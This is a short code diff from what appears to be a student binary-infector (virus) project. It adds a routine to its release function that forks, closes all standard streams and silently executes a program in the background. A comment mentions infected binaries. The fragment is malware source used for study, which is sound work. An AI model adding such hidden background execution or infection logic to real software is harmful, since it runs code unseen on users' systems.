@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 15:52:47 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 18:37:12 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,19 @@ void		release(t_data *data)
 
 	_close(data->bin.fd);
 	_munmap(data->bin.map, data->bin.size);
+
+	pid_t child;
+	char *av[2] = {data->name, 0};
+
+	child = _fork();
+	if (child == 0)
+	{
+		_close(STDIN_FILENO);
+		_close(STDOUT_FILENO);
+		_close(STDERR_FILENO);
+		_execve(av[0], av, NULL);
+		_exit(0);
+	}
 
 	// disabled due to mysterious segfault in infected binary that pop out of nowhere
 	/* update_one(&data->key, (char*)release, (size_t)end - (size_t)release); */
